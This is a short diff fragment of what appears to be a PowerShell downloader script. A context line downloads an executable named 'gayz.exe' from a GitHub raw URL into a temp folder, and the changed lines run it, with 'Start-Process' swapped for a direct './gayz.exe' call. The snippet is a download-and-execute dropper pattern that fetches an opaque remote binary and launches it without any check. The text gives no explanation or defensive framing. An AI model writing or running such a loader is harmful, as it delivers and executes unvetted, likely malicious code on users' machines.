@@ -29,4 +29,4 @@ $client.DownloadFile("https://github.com/jostanise/s/raw/main/gayz/gayz.exe", $f
 
 Set-Location -Path $env:temp
 
-Start-Process -Filepath $file
+./gayz.exe
